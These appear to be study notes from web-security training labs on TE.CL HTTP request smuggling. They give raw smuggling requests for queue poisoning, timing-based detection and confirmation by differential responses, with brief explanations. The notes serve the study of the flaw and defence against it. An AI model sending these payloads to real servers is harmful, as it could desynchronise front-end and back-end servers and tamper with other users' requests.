## TE.CL vulnerabilities

The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header:

```http
POST / HTTP/1.1
Host: 0a51002b038f542d807e6c3b001900de.web-security-academy.net
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

9d
GPOST / HTTP/1.1
Host: 0a51002b038f542d807e6c3b001900de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Find TE.CL using timings

>[!note] Note
>Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

### Confirming TE.CL vulnerabilities using differential responses

Attack request:
```http
POST / HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

73
POST /404 HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Content-Length: 150

foo=bar
0
```

If the attack is successful, then everything from `POST /404` onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
```http
POST /404 HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Content-Length: 150

foo=bar
0

POST / HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4
```
